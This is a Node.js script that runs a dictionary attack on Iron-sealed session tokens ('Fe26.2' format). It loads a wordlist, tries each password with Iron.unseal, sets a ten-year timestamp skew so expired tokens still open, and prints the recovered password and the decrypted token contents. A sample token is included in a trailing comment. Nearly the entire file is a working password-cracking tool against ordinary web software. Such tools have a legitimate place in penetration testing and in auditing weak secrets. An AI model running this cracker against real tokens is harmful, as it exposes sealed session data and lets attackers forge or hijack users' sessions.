'use strict';
const fs = require('fs');
const Iron = require('iron');

const argOpts = { string: ['token','wordlist'], boolean: 'h' };
const argv = require('minimist')(process.argv.slice(2), argOpts);

function IronToken(tokenString) {

  //const self = this;
  const token = tokenString;
  const tokenParts = token.split('*');
  const encryptionSalt = tokenParts[2];
  const integritySalt = tokenParts[6];
  const TEN_YEARS_SECONDS = (60 * 60 * 24 * 365 * 10);

  function base64DecodedLength(str) { return (new Buffer(str, 'base64')).length; }

  const ironOptions = {
    encryption: {
        saltBits: base64DecodedLength(encryptionSalt),
        algorithm: 'aes-256-cbc',
        iterations: 1
    },
    integrity: {
        saltBits: base64DecodedLength(integritySalt),
        algorithm: 'sha256',
        iterations: 1
    },
    ttl: 0,
    timestampSkewSec: TEN_YEARS_SECONDS, // Accept expired tokens.
    localtimeOffsetMsec: 0
  };

  function unseal (password, callback) {
    return Iron.unseal(token, password, ironOptions, callback);
  }

  function passwordFound (result) {
    console.log("");
    console.log(`Unsealed Token: ${JSON.stringify(result.token)}`);
    console.log(`Password Found! - '${result.password}'`);
    console.log("");
  }

  this.guessPassword = function(guess) {
    unseal(guess, function (err, unsealed) {
      if (err === null) {
        passwordFound({password: guess, token: unsealed});
      }
    });
  };

}

IronToken.isValidToken = function (token) {
  var parts = token.split('*');
  return ((parts.length === 8)
           && (parts[0] === 'Fe26.2')
           && (parts[4] !== '')
           && (parts[7] !== ''));
};

IronToken.dictionaryAttack = function (token, dict) {

  function tryWordlist (wordlist) {
    var ironToken = new IronToken(token);
    console.log("Starting Password Brute-Force...");
    wordlist.forEach(ironToken.guessPassword);
  }

  function loadedDictionary (err, data) {
    if(err === null) {
      tryWordlist(data.split('\n'));
    } else {
      console.log("Failed to load dictionary file.");
    }
  }

  if(!IronToken.isValidToken(token)) {
    console.log("Invalid token. Iron tokens begin with 'Fe26.2*'.");
    return -1;
  }

  const wordlistFilename = dict || 'wordlist.txt';
  fs.readFile(wordlistFilename, 'utf8', loadedDictionary);

  return 0;
};



if (require.main === module) {
  if (argv.h) {
    console.log(`Usage: process.args[0] process.args[1] [-h] --token <iron_token> [--wordlist]\n\n`);
    process.exit(0);
  }

  if (!argv.token){
    console.log("Error: No --token argument provided.");
    process.exit(-1);
  }

  IronToken.dictionaryAttack(argv.token, argv.wordlist);

} else {

  module.exports = {
    dictionaryAttack: IronToken.dictionaryAttack,
    isValidToken: IronToken.isValidToken
  }; 

}


/* TEST TOKEN
Fe26.2**0cdd607945dd1dffb7da0b0bf5f1a7daa6218cbae14cac51dcbd91fb077aeb5b*aOZLCKLhCt0D5IU1qLTtYw*g0ilNDlQ3TsdFUqJCqAm9iL7Wa60H7eYcHL_5oP136TOJREkS3BzheDC1dlxz5oJ**05b8943049af490e913bbc3a2485bee2aaf7b823f4c41d0ff0b7c168371a3772*R8yscVdTBRMdsoVbdDiFmUL8zb-c3PQLGJn4Y8C-AqI
*/

